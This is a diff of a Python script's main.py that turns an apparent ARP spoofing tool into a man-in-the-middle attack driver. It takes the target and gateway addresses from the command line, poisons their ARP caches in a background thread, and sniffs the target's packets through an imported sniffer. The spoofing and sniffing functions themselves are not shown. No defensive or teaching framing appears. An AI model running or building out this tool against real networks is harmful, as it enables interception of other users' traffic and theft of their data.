@@ -1,21 +1,27 @@
 #!/usr/bin/env python3
 # main.py
 from spoofer import *
+import sys
+import threading
+from sniffer import readPackets
 
-if __name__ == "__main__":
-
-	target = "100.64.1.108"
-	host = "100.64.1.1"
-	verbose = True
-
+def main():
+	target = sys.argv[1]
+	host = sys.argv[2]
+	verbose = False
 	try:
-		while True:
-			spoof(target, host, verbose)
-			spoof(host, target, verbose)
-			time.sleep(1)
+
+		t1 = threading.Thread(target=arpSpoof, args=(target, host, verbose,))
+		t1.daemon = True
+		t1.start()
+		readPackets(target)
+		t1.join()
 
 	except KeyboardInterrupt:
-		print("Restoring network")
-		restore(target, host)
-		restore(host, target)
+		print("\tARP Spoofing interrupted. Restoring network.")
+		restore(target, host, verbose)
+		restore(host, target, verbose)
 
+
+if __name__ == "__main__":
+	main()
